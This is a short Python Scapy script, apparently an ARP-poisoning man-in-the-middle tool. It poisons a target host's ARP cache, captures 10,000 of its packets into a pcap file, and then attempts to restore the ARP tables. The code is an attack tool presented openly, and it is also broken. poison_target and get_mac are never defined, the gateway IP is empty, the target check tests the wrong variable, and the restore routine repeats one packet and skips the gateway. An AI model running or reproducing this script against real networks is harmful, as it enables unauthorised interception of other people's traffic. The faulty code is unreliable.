from scapy.all import *
import os
import sys
import threading
import signal

interface = 'en1'
target_ip = '172.16.1.71'
gateway_ip = ''
packet_count = 10000
conf.iface = interface
conf.verb = 0
print('[*] Setting up %s'%interface)

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print('[!!!]Failed to get gateway MAC .Exiting.')
    sys.exit(0)
else:
    print('[*]Gateway %s is at %s'%(gateway_ip,gateway_mac))

target_mac = get_mac(target_ip)
if gateway_mac is None:
    print('[!!!]Failed to get target MAC .Exiting.')
    sys.exit(0)
else:
    print('[*]Target %s is at %s' % (target_ip, target_mac))

poison_thread = threading.Thread(target = poison_target,args = (gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
    print('[*] Starting sniffer for %d packets'%packet_count)
    bpf_filter = 'ip host %s'%target_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface = interface)
    wrpcap('arper.pcap',packets)
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)



def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print('[*]Restoring target...')
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac), count=5)